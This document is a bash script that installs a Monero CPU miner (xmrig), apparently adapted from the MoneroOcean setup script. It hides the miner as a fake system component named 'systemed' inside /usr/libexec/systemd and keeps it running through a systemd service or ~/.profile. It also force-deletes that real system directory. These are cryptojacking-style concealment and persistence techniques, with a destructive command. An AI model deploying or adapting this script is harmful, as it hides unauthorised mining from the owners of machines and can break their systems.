#!/bin/bash

VERSION=2.11

# printing greetings
echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites
if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

# calculating port and CPU threads
# Get CPU topology
TOTAL_SOCKETS=$(lscpu | grep 'Socket(s)' | awk '{print $2}')
CORES_PER_SOCKET=$(lscpu | grep 'Core(s) per socket' | awk '{print $4}')
THREADS_PER_CORE=$(lscpu | grep 'Thread(s) per core' | awk '{print $4}')
CPU_THREADS=$((TOTAL_SOCKETS * CORES_PER_SOCKET * THREADS_PER_CORE))
THREADS_PER_SOCKET=$((CORES_PER_SOCKET * THREADS_PER_CORE))

# Calculate threads to use based on socket count
if [ $TOTAL_SOCKETS -eq 1 ]; then
  # Single socket - use 50% threads
  USE_THREADS=$((THREADS_PER_SOCKET / 2))
  USE_THREADS=$((USE_THREADS > 0 ? USE_THREADS : 1))
  CPU_USAGE="50% of CPU threads ($USE_THREADS/$THREADS_PER_SOCKET)"
  CPU_AFFINITY="null"
elif [ $TOTAL_SOCKETS -eq 2 ]; then
  # Dual socket - use one full socket
  USE_THREADS=$THREADS_PER_SOCKET
  CPU_USAGE="1 full socket ($USE_THREADS threads)"
  CPU_AFFINITY=$(seq -s "," 0 $((THREADS_PER_SOCKET - 1)))
elif [ $TOTAL_SOCKETS -ge 4 ]; then
  # Quad socket or more - use two full sockets
  USE_THREADS=$((THREADS_PER_SOCKET * 2))
  CPU_USAGE="2 full sockets ($USE_THREADS threads)"
  CPU_AFFINITY=$(seq -s "," 0 $((THREADS_PER_SOCKET * 2 - 1)))
else
  # Fallback for other cases
  USE_THREADS=$((CPU_THREADS / 2))
  USE_THREADS=$((USE_THREADS > 0 ? USE_THREADS : 1))
  CPU_USAGE="50% of CPU threads ($USE_THREADS/$CPU_THREADS)"
  CPU_AFFINITY="null"
fi

EXP_MONERO_HASHRATE=$(( USE_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi

# printing intentions
echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by /usr/libexec/systemd/systemed script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using systemed systemd service."
fi

echo
echo "System CPU Information:"
echo "Sockets: $TOTAL_SOCKETS"
echo "Cores per socket: $CORES_PER_SOCKET"
echo "Threads per core: $THREADS_PER_CORE"
echo "Threads per socket: $THREADS_PER_SOCKET"
echo "Total threads: $CPU_THREADS"
echo "Will use: $CPU_USAGE"
echo "CPU Affinity: ${CPU_AFFINITY:-"auto"}"
echo "Projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo
echo

# start doing stuff: preparing miner
echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop systemed.service
fi
killall -9 systemed

echo "[*] Removing /usr/libexec/systemd directory"
rm -rf /usr/libexec/systemd

echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to /usr/libexec/systemd"
[ -d /usr/libexec/systemd ] || mkdir -p /usr/libexec/systemd
if ! tar xf /tmp/xmrig.tar.gz -C /usr/libexec/systemd; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to /usr/libexec/systemd directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Renaming xmrig to systemed"
mv /usr/libexec/systemd/xmrig /usr/libexec/systemd/systemed

echo "[*] Checking if advanced version of /usr/libexec/systemd/systemed works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' /usr/libexec/systemd/config.json
/usr/libexec/systemd/systemed --help >/dev/null
if (test $? -ne 0); then
  if [ -f /usr/libexec/systemd/systemed ]; then
    echo "WARNING: Advanced version of /usr/libexec/systemd/systemed is not functional"
  else 
    echo "WARNING: Advanced version of /usr/libexec/systemd/systemed was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to /usr/libexec/systemd"
  if ! tar xf /tmp/xmrig.tar.gz -C /usr/libexec/systemd --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to /usr/libexec/systemd directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Renaming xmrig to systemed"
  mv /usr/libexec/systemd/xmrig /usr/libexec/systemd/systemed

  echo "[*] Checking if stock version of /usr/libexec/systemd/systemed works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /usr/libexec/systemd/config.json
  /usr/libexec/systemd/systemed --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f /usr/libexec/systemd/systemed ]; then
      echo "ERROR: Stock version of /usr/libexec/systemd/systemed is not functional too"
    else 
      echo "ERROR: Stock version of /usr/libexec/systemd/systemed was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner /usr/libexec/systemd/systemed is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

echo "[*] Configuring systemed to use $USE_THREADS threads ($CPU_USAGE)"
sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' /usr/libexec/systemd/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' /usr/libexec/systemd/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' /usr/libexec/systemd/config.json
sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": '$USE_THREADS',/' /usr/libexec/systemd/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' /usr/libexec/systemd/config.json
sed -i 's#"log-file": *null,#"log-file": "/var/log/systemed.log",#' /usr/libexec/systemd/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' /usr/libexec/systemd/config.json

# Set CPU affinity if needed
if [ "$CPU_AFFINITY" != "null" ]; then
  echo "[*] Setting CPU affinity to: $CPU_AFFINITY"
  sed -i 's/"cpu-affinity": *null,/"cpu-affinity": "'$CPU_AFFINITY'",/' /usr/libexec/systemd/config.json
fi

cp /usr/libexec/systemd/config.json /usr/libexec/systemd/config_background.json
sed -i 's/"background": *false,/"background": true,/' /usr/libexec/systemd/config_background.json

# preparing script
echo "[*] Creating /usr/libexec/systemd/miner.sh script"
cat >/usr/libexec/systemd/miner.sh <<EOL
#!/bin/bash
if ! pidof systemed >/dev/null; then
  nice /usr/libexec/systemd/systemed --config=/usr/libexec/systemd/config.json \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall systemed\" or \"sudo killall systemed\" if you want to remove background miner first."
fi
EOL

chmod +x /usr/libexec/systemd/miner.sh

# preparing script background work and work under reboot
if ! sudo -n true 2>/dev/null; then
  if ! grep /usr/libexec/systemd/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding /usr/libexec/systemd/miner.sh script to $HOME/.profile"
    echo "/usr/libexec/systemd/miner.sh >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like /usr/libexec/systemd/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in /var/log/systemed.log file)"
  /bin/bash /usr/libexec/systemd/miner.sh >/dev/null 2>&1
else
  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then
    echo "[*] Running miner in the background (see logs in /var/log/systemed.log file)"
    /bin/bash /usr/libexec/systemd/miner.sh >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
  else
    echo "[*] Creating systemed systemd service"
    cat >/tmp/systemed.service <<EOL
[Unit]
Description=Systemed Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/libexec/systemd/systemed --config=/usr/libexec/systemd/config.json
Restart=always
RestartSec=30
Nice=10
CPUWeight=50

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/systemed.service /etc/systemd/system/systemed.service
    echo "[*] Starting systemed systemd service"
    sudo killall systemed 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable systemed.service
    sudo systemctl start systemed.service
    echo "To see miner service logs run \"sudo journalctl -u systemed -f\" command"
  fi
fi

echo ""
echo "NOTE: Miner is configured to use $USE_THREADS threads ($CPU_USAGE)."
echo "System CPU Details:"
echo "  Sockets: $TOTAL_SOCKETS"
echo "  Cores per socket: $CORES_PER_SOCKET"
echo "  Threads per core: $THREADS_PER_CORE"
echo "  Threads per socket: $THREADS_PER_SOCKET"
echo "  Total threads: $CPU_THREADS"
if [ "$CPU_AFFINITY" != "null" ]; then
  echo "  CPU Affinity: $CPU_AFFINITY"
fi
echo ""

echo "[*] Setup complete"